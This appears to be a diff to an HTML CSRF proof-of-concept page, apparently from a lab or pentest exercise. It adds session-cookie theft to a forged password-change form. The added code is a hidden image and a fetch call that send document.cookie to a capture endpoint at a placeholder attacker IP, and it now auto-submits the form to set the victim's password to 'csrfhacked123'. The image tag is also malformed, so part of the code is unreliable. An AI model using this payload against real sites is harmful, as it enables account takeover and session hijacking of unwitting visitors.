@@ -5,8 +5,11 @@
 </head>
 <body>
     <h1>CSRF PoC - Change Account Password</h1>
-    <p>This form will attempt to change your account password to "csrfhacked123".</p>
-    
+    <p>This form will attempt to change your account password to "csrfhacked123" and capture your session cookie.</p>
+
+    <!-- Hidden image to exfiltrate cookie -->
+    <img src="http://[YOUR_ATTACKER_IP]:8000/capture?cookie=" + document.cookie style="display:none;" onerror="console.log('Cookie sent')">
+
     <!-- CSRF Form - Account Password Update -->
     <form action="http://10.0.0.10/account/update" method="POST" id="csrfForm">
         <input type="hidden" name="password" value="csrfhacked123">
@@ -14,10 +17,21 @@
         <input type="hidden" name="updateField" value="account">
         <button type="submit">Test CSRF - Change Password</button>
     </form>
-    
+
     <script>
-        // Auto-submit the form (optional - remove for manual testing)
-        // document.getElementById('csrfForm').submit();
+        // Exfiltrate cookie using fetch (fallback method)
+        fetch('http://[127.0.0.1]:8000/capture', {
+            method: 'POST',
+            body: 'cookie=' + encodeURIComponent(document.cookie),
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+        }).catch(err => console.log('Cookie exfiltration attempt'));
+
+        // Optional: Auto-submit the form after cookie exfiltration
+        setTimeout(() => {
+            document.getElementById('csrfForm').submit();
+        }, 1000);
     </script>
 </body>
 </html>
